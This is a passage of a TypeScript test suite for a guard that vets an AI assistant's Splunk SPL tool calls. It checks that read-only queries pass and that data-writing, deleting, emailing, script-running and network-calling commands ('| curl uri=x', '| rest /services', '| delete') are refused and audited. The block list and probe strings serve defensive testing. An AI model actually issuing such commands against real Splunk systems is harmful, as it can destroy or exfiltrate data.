        '`sap_logserv_idx_macro` | makeresults | eval x="say \\"| delete\\" now" | table x',
        '| makeresults | eval x="a\\\\" | table x',
        'index=x "\\"user\\":\\"bob\\"" | stats count',
        '`sap_logserv_idx_macro` | stats count by user | fit DensityFunction count by "a|b"',
        /* Round 4: `into` with no fit at command position before it, quoted
         * text naming fit, apostrophes, and look-alikes of fit / into. */
        '`sap_logserv_idx_macro` | stats count by fit, into | eval note="fit x into y"',
        '`sap_logserv_idx_macro` | search msg="| fit x into y" | stats count by host',
        '`sap_logserv_idx_macro` | eval \'fit\'=1 | stats count by into',
        '`sap_logserv_idx_macro` | stats count by user | fit DensityFunction count | eval into_n=1, \'into_m\'=2',
        '| makeresults | fitness x | stats count by into',
        '`sap_logserv_idx_macro` "don\'t" | stats count by host',
        '`sap_logserv_idx_macro` | eval \'saved search\'=1, dns=\'lookup\' | table \'saved search\', dns',
        /* Look-alikes of the new commands and lookups. */
        '`sap_logserv_idx_macro` | eval rest_time=1 | stats avg(rest_time)',
        '`sap_logserv_idx_macro` | search message="restart" | stats count',
        '`sap_logserv_idx_macro` | search macro=1 | stats count by macro',
        '`sap_logserv_idx_macro` | eval curl_count=1, wget_x=2, stashed=3 | table curl_count, wget_x, stashed',
        '`sap_logserv_idx_macro` | lookup dnslookup_cache host OUTPUT ip',
        '`sap_logserv_idx_macro` | lookup local=t squid_actions_210 code OUTPUT action',
        /* The primer's SPL idioms. */
        '`sap_logserv_idx_macro` | stats count by FIELD | sort -count',
        '`sap_logserv_idx_macro` | timechart span=1h count',
        '`sap_logserv_idx_macro` | top limit=10 FIELD',
        '`sap_logserv_idx_macro` | stats dc(host) AS distinct_hosts',
        '`sap_logserv_idx_macro` | stats count(eval(status>=400)) AS errors count AS total | eval pct=round(100*errors/total,2)',
        '`sap_logserv_idx_macro` | bin _time span=1h | stats count by host _time',
    ];
    for (const q of readOnly) {
        const r = sg.analyzeSpl(q);
        check(`G4 read-only passes: ${JSON.stringify(q)}`, r.blocked === false, JSON.stringify(r));
    }
    const hitPrompt = prompts.filter((p) => sg.analyzeSpl(p.spl).blocked);
    check('G5 no intent-map prompt SPL is blocked', hitPrompt.length === 0,
        hitPrompt.map((p) => `${p.savedSearch}: ${sg.analyzeSpl(p.spl).operator}`).join('; '));
    const hitConf = intentNames.filter((n) => sg.analyzeSpl(stanzaSearch[n] || '').blocked);
    check('G6 no intent-map stanza search is blocked', hitConf.length === 0,
        hitConf.map((n) => `${n}: ${sg.analyzeSpl(stanzaSearch[n]).operator}`).join('; '));
    const unblockedWriters = writers.filter((n) => !sg.analyzeSpl(stanzaSearch[n]).blocked);
    check('G7 every writing stanza\'s SPL is blocked as an ad-hoc query', unblockedWriters.length === 0,
        unblockedWriters.join(', '));
}

/* ============================ H. the wiring (source pins) ============================ */

const mcpSrc: string = fs.readFileSync(path.join(HOME, 'components/ai/mcp/MCPClient.ts'), 'utf8').replace(/\r\n/g, '\n');
const hookSrc: string = fs.readFileSync(path.join(HOME, 'hooks/useAIAssistant.ts'), 'utf8').replace(/\r\n/g, '\n');

/* The text of a member from its opening line to the first line that closes
 * at `indent` (e.g. '    }' for a class method, '}' for a module const). */
const block = (src: string, opener: string, close: string): string => {
    const at = src.indexOf(opener);
    if (at === -1) return '';
    const end = src.indexOf(`\n${close}\n`, at);
    return end === -1 ? '' : src.slice(at, end + close.length + 1);
};
const count = (s: string, needle: string): number => s.split(needle).length - 1;
const codeOnly = (s: string): string => s
    .split('\n')
    .map((l) => l.replace(/\/\/.*$/, ''))
    .join('\n')
    .replace(/\/\*[\s\S]*?\*\//g, '');

{
    const run = codeOnly(block(mcpSrc, '    async runSavedSearch(', '    }'));
    check('H1 MCPClient.runSavedSearch found', run.length > 0, 'not found');
    check('H2 runSavedSearch takes the allowed set (required) and a typed time range',
        /async runSavedSearch\(\s*name: string,\s*allowed: ReadonlySet<string>,\s*time: SavedSearchTimeRange = \{\},?\s*\)/.test(run),
        run.split('\n').slice(0, 5).join(' | '));
    const iCheck = run.indexOf('checkSavedSearchName(name, allowed)');
    const iRefuse = run.indexOf('if (!verdict.allowed)');
    const iCall = run.indexOf('this.callTool(');
    check('H3 runSavedSearch checks the name, then refuses, before any request',
        iCheck !== -1 && iRefuse > iCheck && iCall > iRefuse && /if \(!verdict\.allowed\) \{[\s\S]*?return markHidden/.test(run)
        && run.indexOf('return', iRefuse) < iCall,
        `${iCheck} ${iRefuse} ${iCall}`);
    check('H4 runSavedSearch sends exactly buildSavedSearchArgs(name, time)',
        count(run, 'this.callTool(') === 1
        && run.indexOf('this.callTool(TOOL_RUN_SAVED_SEARCH, buildSavedSearchArgs(name, time))') !== -1,
        'the one callTool must send the built arguments');
    check('H5 runSavedSearch spreads nothing', run.indexOf('...') === -1, 'a spread in runSavedSearch');
    const inv = codeOnly(block(mcpSrc, '    async invokeTool(', '    }'));
    const iGuard = inv.indexOf('if (name === TOOL_RUN_SAVED_SEARCH)');
    check('H6 invokeTool refuses the saved-search tool before calling it',
        iGuard !== -1 && inv.indexOf('return markHidden', iGuard) !== -1
        && inv.indexOf('return markHidden', iGuard) < inv.indexOf('this.callTool('),
        'invokeTool must refuse splunk_run_saved_search');
    const mcpCode = codeOnly(mcpSrc);
    check('H7 MCPClient sends the saved-search tool from runSavedSearch only',
        count(mcpCode, 'callTool(TOOL_RUN_SAVED_SEARCH') === 1 && mcpCode.indexOf("'splunk_run_saved_search'") === -1,
        'another saved-search send path');
}
{
    const hookCode = codeOnly(hookSrc);
    check('H8 the set is built from the intent map',
        /const ALLOWED_SAVED_SEARCHES: ReadonlySet<string> = buildAllowedSavedSearches\(\s*\(intentMap as unknown as IntentMapShape\)\.prompts,?\s*\);/
            .test(hookCode),
        'ALLOWED_SAVED_SEARCHES');
    check('H9 the canned path passes the set',
        hookCode.indexOf('ctx.mcpClient.runSavedSearch(savedSearchName, ALLOWED_SAVED_SEARCHES, dispatchArgs)') !== -1,
        'runCannedPrompt');
    check('H10 runSavedSearch is called on exactly two paths', count(hookCode, '.runSavedSearch(') === 2,
        String(count(hookCode, '.runSavedSearch(')));
    const disp = codeOnly(block(hookSrc, 'const dispatchTool = async (', '};'));
    check('H11 dispatchTool found', disp.length > 0, 'not found');
    check('H12 the free-form path passes the set and the time range only',
        disp.indexOf('mcpClient.runSavedSearch(name, ALLOWED_SAVED_SEARCHES, pickSavedSearchTimeRange(args))') !== -1,
        'dispatchTool saved-search branch');
    check('H13 dispatchTool forwards no arguments object and spreads nothing',
        disp.indexOf('args.arguments') === -1 && disp.indexOf('...') === -1, 'spread or args.arguments in dispatchTool');
    check('H14 dispatchTool forwards no undeclared tool',
        disp.indexOf('invokeTool(toolName') === -1
        && count(disp, 'invokeTool(') === count(disp, "invokeTool('splunk_run_query'"),
        'an invokeTool call that is not splunk_run_query');
    {
        const lastReturn = disp.lastIndexOf('return ');
        check('H15 dispatchTool ends in a refusal', lastReturn !== -1 && /^return markHidden<MCPToolResult>\(\{[\s\S]*?isError: true/
            .test(disp.slice(lastReturn)), disp.slice(lastReturn, lastReturn + 80));
    }
    const iVet = hookCode.indexOf('const toolVerdict = vetToolCall(toolName, parsedArgs, ALLOWED_SAVED_SEARCHES);');
    const iDispatch = hookCode.indexOf('await dispatchTool(ctx.mcpClient, toolName, mcpArgs)');
    check('H16 the tool loop vets each call before dispatching it',
        count(hookCode, 'vetToolCall(') === 1 && iVet !== -1 && iDispatch > iVet, `${iVet} ${iDispatch}`);
    {
        const at = hookCode.indexOf('if (!toolVerdict.ok) {', iVet);
        const end = at === -1 ? -1 : hookCode.indexOf('return;', at);
        const refusal = at === -1 || end === -1 ? '' : hookCode.slice(at, end + 7);
        check('H17 a refused call is audited as security_blocked_spl and never dispatched',
            refusal.length > 0 && end < iDispatch
            && refusal.indexOf("category: 'security_blocked_spl'") !== -1
            && refusal.indexOf('operator: toolVerdict.operator') !== -1
            && refusal.indexOf('spl: truncate(toolVerdict.auditSpl, 1000)') !== -1
            && refusal.indexOf('ctx.actions.recordAudit(refusedAudit)') !== -1
            && refusal.indexOf('isError: true') !== -1
            && refusal.indexOf('errorMessage: toolVerdict.reason') !== -1,
            refusal.slice(0, 120));
    }
}

/* ============================ I. splGuard macros and refusal text ============================ */

{
    /* ALLOWED_SPL_MACROS is the stanza set of the App's macros.conf, exactly. */
    const macrosConf: string = fs.readFileSync(path.join(DEFAULT_DIR, 'macros.conf'), 'utf8');
    const stanzas: string[] = [];
    for (const raw of macrosConf.split('\n')) {
        const head = /^\[(.+)\]\s*$/.exec(raw.replace(/\r$/, '').trim());
        if (head) stanzas.push(head[1]);
    }
    const allowedMacros: string[] = (sg.ALLOWED_SPL_MACROS as string[]).slice();
    check('I1 macros.conf has stanzas', stanzas.length > 0, String(stanzas.length));
    check('I2 ALLOWED_SPL_MACROS is the macros.conf stanza set',
        sameJson(allowedMacros.slice().sort(), stanzas.slice().sort()),
        `${JSON.stringify(allowedMacros)} vs ${JSON.stringify(stanzas)}`);
    /* Each App macro, referenced as its stanza declares, passes. */
    for (const st of stanzas) {
        const arity = /^(.+)\((\d+)\)$/.exec(st);
        const ref = arity ? `${arity[1]}(${Array.from({ length: Number(arity[2]) }, (_v, i) => `a${i}`).join(', ')})` : st;
        const r = sg.analyzeSpl(`\`${ref}\` | stats count`);
        check(`I3 the App macro passes: ${st}`, r.blocked === false, JSON.stringify(r));
    }
    /* Every macro the hook (primer, tool description) names is the App's. */
    const named = Array.from(new Set<string>(hookSrc.match(/\b[a-z0-9_]+_macro\b/g) || []));
    check('I4 the hook names a macro', named.length > 0, 'none');
    const foreign = named.filter((n) => allowedMacros.indexOf(n) === -1);
    check('I5 every macro the hook names is allowed', foreign.length === 0, foreign.join(', '));
    /* The tool description's example query passes. */
    const ex = /'Example: ([^']*)' \+\s*'([^']*?)\.?',/.exec(hookSrc);
    check('I6 the tool description has an example query', ex !== null, 'not found');
    if (ex) {
        const q = ex[1] + ex[2];
        const r = sg.analyzeSpl(q);
        check(`I7 the tool description's example passes: ${JSON.stringify(q)}`, r.blocked === false && q.indexOf('`') !== -1,
            JSON.stringify(r));
    }
    /* Exact arity matching, on a synthetic list. */
    const syn = ['m(2)', 'plain', 'z(0)'];
    const arityCases: Array<[string, boolean]> = [
        ['m(a, b)', true],
        ['m("a,b", c)', true],
        ['m("a\\"b,c", d)', true],
        ['m(a)', false],
        ['m(a, b, c)', false],
        ['m', false],
        ['m()', false],
        ['M(a, b)', false],
        ['plain', true],
        ['plain()', false],
        ['plain(1)', false],
        [' plain', false],
        ['plain ', false],
        ['z()', false],
        ['z', false],
        ['', false],
        ['other', false],
    ];
    for (const [ref, want] of arityCases) {
        check(`I8 macroReferenceAllowed(${JSON.stringify(ref)}) === ${want}`, sg.macroReferenceAllowed(ref, syn) === want,
            String(sg.macroReferenceAllowed(ref, syn)));
    }
    check('I9 the default list is ALLOWED_SPL_MACROS',
        allowedMacros.every((n) => /\(\d+\)$/.test(n) || sg.macroReferenceAllowed(n) === true)
        && sg.macroReferenceAllowed('comment("x")') === false && sg.macroReferenceAllowed('evil') === false,
        'macroReferenceAllowed default');
    check('I10 operator names', sg.OPERATOR_INLINE_COMMENT === 'inline_comment' && sg.OPERATOR_MACRO === 'macro'
        && sg.OPERATOR_UNBALANCED_BACKTICK === 'unbalanced_backtick' && sg.OPERATOR_FIT_INTO === 'fit_into'
        && sg.OPERATOR_UNTERMINATED_QUOTE === 'unterminated_quote' && sg.OPERATOR_ESCAPED_QUOTE === 'escaped_quote'
        && sg.OPERATOR_EXTERNAL_LOOKUP === 'external_lookup',
        `${sg.OPERATOR_INLINE_COMMENT} ${sg.OPERATOR_MACRO} ${sg.OPERATOR_UNBALANCED_BACKTICK} ${sg.OPERATOR_FIT_INTO}`
        + ` ${sg.OPERATOR_UNTERMINATED_QUOTE} ${sg.OPERATOR_ESCAPED_QUOTE} ${sg.OPERATOR_EXTERNAL_LOOKUP}`);
    /* No refusal enumerates: none names an allowed macro or a forbidden
     * command other than its own operator. */
    const probes = [
        '| saved```x```search y', '`evil`', '`sap_logserv_idx_macro', '| fit X a into m', '| ai prompt="x"',
        '| deletemodel m', '| collect index=x', '| savedsearch x', '| macro x', '| rest /services', '| curl uri=x',
        '| lookup dnslookup h', '| search "abc', 'a \\" b', '| "delete"', '| savedsplunk x', '| stash index=x',
        '| "saved"search x', '| from \'saved\'search:x', '| lookup "dns"lookup h', '| fit X \'a|b\' into m',
        '| fit X "in"to m', '| \'delete\'',
    ];
    const forbidden: string[] = (sg.FORBIDDEN_SPL_COMMANDS as string[]).concat(sg.FORBIDDEN_SPL_WORDS as string[]);
    for (const q of probes) {
        const r = sg.analyzeSpl(q);
        const reason = typeof r.reason === 'string' ? r.reason : '';
        const macros = allowedMacros.filter((m) => reason.indexOf(m.replace(/\(\d+\)$/, '')) !== -1);
        const cmds = forbidden.filter((c) => new RegExp(`\\b${c}\\b`, 'i').test(reason) && c !== r.operator);
        check(`I11 the refusal enumerates nothing: ${JSON.stringify(q)}`,
            r.blocked === true && reason.length > 0 && reason.length < 400 && macros.length === 0 && cmds.length === 0,
            `${JSON.stringify(r)} macros=[${macros.join(', ')}] commands=[${cmds.join(', ')}]`);
    }
}

/* ============================ J. splGuard lists and quote blanking (round 3) ============================ */

{
    const cmds: string[] = (sg.FORBIDDEN_SPL_COMMANDS as string[]).slice();
    const words: string[] = (sg.FORBIDDEN_SPL_WORDS as string[]).slice();
    /* Every `alias =` line of a listed command's stanza in Splunk 9.4.3's
     * system/default/searchbnf.conf (read on splunk-sh-idxr, session 149):
     * L3760 script, L3793 savedsearch, L4435 collect. */
    const SEARCHBNF_ALIASES: Record<string, string[]> = {
        collect: ['stash', 'summaryindex', 'sumindex'],
        script: ['run'],
        savedsearch: ['macro', 'savedsplunk'],
    };
    for (const base of Object.keys(SEARCHBNF_ALIASES)) {
        const listed = cmds.indexOf(base) !== -1 || words.indexOf(base) !== -1;
        check(`J1 the aliased command is refused: ${base}`, listed, base);
        for (const alias of SEARCHBNF_ALIASES[base]) {
            check(`J2 its alias is a command-position entry: ${alias}`, cmds.indexOf(alias) !== -1, alias);
        }
    }
    check('J3 savedsearch and savedsplunk are refused as words anywhere',
        words.indexOf('savedsearch') !== -1 && words.indexOf('savedsplunk') !== -1, JSON.stringify(words));
    check('J4 macro is refused at command position only', cmds.indexOf('macro') !== -1 && words.indexOf('macro') === -1,
        JSON.stringify(words));
    const NEED = ['collect', 'stash', 'summaryindex', 'sumindex', 'mcollect', 'meventcollect', 'outputlookup', 'outputcsv',
        'outputtext', 'delete', 'sendalert', 'sendemail', 'script', 'run', 'runshellscript', 'dump', 'tscollect',
        'createrss', 'rest', 'outputtelemetry', 'curl', 'wget', 'sendresults', 'ai', 'deletemodel', 'macro',
        'savedsplunk', 'map'];
    const lack = NEED.filter((c) => cmds.indexOf(c) === -1);
    check('J5 FORBIDDEN_SPL_COMMANDS holds every refused command', lack.length === 0, lack.join(', '));
    check('J6 map is the last command (the build gate reads the list)', cmds[cmds.length - 1] === 'map', cmds[cmds.length - 1]);
    check('J7 the list is lowercase words, no duplicates',
        cmds.every((c) => /^[a-z]+$/.test(c)) && new Set(cmds).size === cmds.length, JSON.stringify(cmds));
    check('J8 dnslookup is an external lookup', (sg.EXTERNAL_LOOKUPS as string[]).indexOf('dnslookup') !== -1,
        JSON.stringify(sg.EXTERNAL_LOOKUPS));

    /* blankQuotedStrings: content blanked, quotes and length kept. */
    const bq = sg.blankQuotedStrings;
    const blankCases: Array<[string, string]> = [
        ['a "b|c" d', 'a "   " d'],
        ['"a\\"b"', '"    "'],
        ['x "a\\\\" y', 'x "   " y'],
        ['"" | "[x]"', '"" | "   "'],
        ['no quotes | here', 'no quotes | here'],
        ['`m` "a\nb" `n`', '`m` "   " `n`'],
        ['', ''],
    ];
    for (const [q, want] of blankCases) {
        const r = bq(q);
        check(`J9 blankQuotedStrings(${JSON.stringify(q)})`,
            r.text === want && r.text.length === q.length && !r.unterminated && !r.escapedQuote, JSON.stringify(r));
    }
    for (const q of ['"abc', 'x "a\\"', 'x "abc\\', '"a" "b']) {
        const r = bq(q);
        check(`J10 unterminated: ${JSON.stringify(q)}`, r.unterminated === true && r.escapedQuote === false && r.text === '',
            JSON.stringify(r));
    }
    for (const q of ['a \\" b', '\\"', 'x \\\\" y']) {
        const r = bq(q);
        check(`J11 escaped quote outside a string: ${JSON.stringify(q)}`, r.escapedQuote === true && r.text === '',
            JSON.stringify(r));
    }
}

/* ============================ K. the allow-list is immutable (round 4) ============================ */

{
    /* Runs f; true when it returned, false when it threw. Either is fine -
     * what counts is that the allow-list did not change. */
    const ran = (f: () => unknown): boolean => {
        try {
            f();
            return true;
        } catch {
            return false;
        }
    };
    const X = 'x_s149_not_a_catalog_name';
    for (const [label, set] of [['fresh', al.buildAllowedSavedSearches(prompts)], ['shared', ALLOWED]] as Array<
        [string, ReadonlySet<string>]
    >) {
        const size0 = set.size;
        const names0 = Array.from(set).sort();
        const same = (): boolean => set.size === size0 && sameJson(Array.from(set).sort(), names0) && set.has(R) && !set.has(X);
        const asSet = set as unknown as Set<string>;
        const r1 = ran(() => asSet.add(X));
        check(`K1 add through a cast throws or changes nothing (${label})`, same() && !set.has(X), `returned=${r1}`);
        const r2 = ran(() => asSet.delete(R));
        check(`K2 delete through a cast throws or changes nothing (${label})`, same(), `returned=${r2}`);
        const r3 = ran(() => asSet.clear());
        check(`K3 clear through a cast throws or changes nothing (${label})`, same(), `returned=${r3}`);
        const r4 = [
            ran(() => Set.prototype.add.call(set as any, X)),
            ran(() => Set.prototype.delete.call(set as any, R)),
            ran(() => Set.prototype.clear.call(set as any)),
        ];
        check(`K4 Set.prototype add / delete / clear called on it change nothing (${label})`, same(), JSON.stringify(r4));
        const r5 = [
            ran(() => {
                (set as any).has = (): boolean => true;
            }),
            ran(() => Object.defineProperty(set, 'has', { value: (): boolean => true })),
            ran(() => {
                (set as any).add = (): void => undefined;
            }),
            ran(() => {
                (set as any).size = 0;
            }),
            ran(() => Object.setPrototypeOf(set, Set.prototype)),
        ];
        check(`K5 its members cannot be replaced or added (${label})`,
            same() && Object.isFrozen(set) && typeof (set as any).add !== 'function'
            && typeof (set as any).delete !== 'function' && typeof (set as any).clear !== 'function',
            JSON.stringify(r5));
        let handed: unknown = null;
        let visited = 0;
        const thisSeen: unknown[] = [];
        const ctx = { tag: 'ctx' };
        set.forEach(function forEachProbe(this: unknown, v: string, v2: string, s: ReadonlySet<string>) {
            visited += v === v2 ? 1 : 0;
            handed = s;
            thisSeen.push(this);
        }, ctx);
        const r6 = [ran(() => (handed as Set<string>).add(X)), ran(() => (handed as Set<string>).clear())];
        check(`K6 forEach hands its callback the read-only view, never a mutable set (${label})`,
            same() && handed === set && visited === size0 && thisSeen.every((t) => t === ctx), JSON.stringify(r6));
        const it = set.values() as unknown as { add?: unknown };
        check(`K7 its iterators expose no set (${label})`, typeof it.add !== 'function'
            && sameJson(Array.from(set.keys()).sort(), names0)
            && Array.from(set.entries()).every(([a, b]) => a === b) && Array.from(set.entries()).length === size0, label);
        check(`K8 prototype names are not members (${label})`,
            !set.has('constructor') && !set.has('__proto__') && !set.has('has') && !set.has('size') && !set.has('add'),
            label);
    }
    {
        /* A copy: changing the prompts after the build reaches nothing. */
        const src: Array<{ savedSearch: string }> = [{ savedSearch: 'ok_name' }];
        const built = al.buildAllowedSavedSearches(src);
        src.push({ savedSearch: X });
        src[0].savedSearch = 'other_name';
        check('K9 the allow-list is a copy of the prompts', built.size === 1 && built.has('ok_name') && !built.has(X)
            && !built.has('other_name'), JSON.stringify(Array.from(built)));
        const a = al.buildAllowedSavedSearches([{ savedSearch: 'a_one' }]);
        const b = al.buildAllowedSavedSearches([{ savedSearch: 'b_two' }]);
        check('K10 two allow-lists share nothing', a.has('a_one') && !a.has('b_two') && b.has('b_two') && !b.has('a_one'),
            `${Array.from(a)} ${Array.from(b)}`);
    }
}

/* ===================================================================== */

if (alFailures > 0) {
    process.stderr.write(`\nsavedSearchAllowList.consistency-test: ${alFailures} failure(s) of ${alChecks}\n`);
    process.exit(1);
}
console.log(
    `savedSearchAllowList.consistency-test: OK (${alChecks} checks; ${intentSet.size} catalog searches allowed, `
    + `${notInIntent.length} other stanzas refused, ${writers.length} of them writers)`,
);
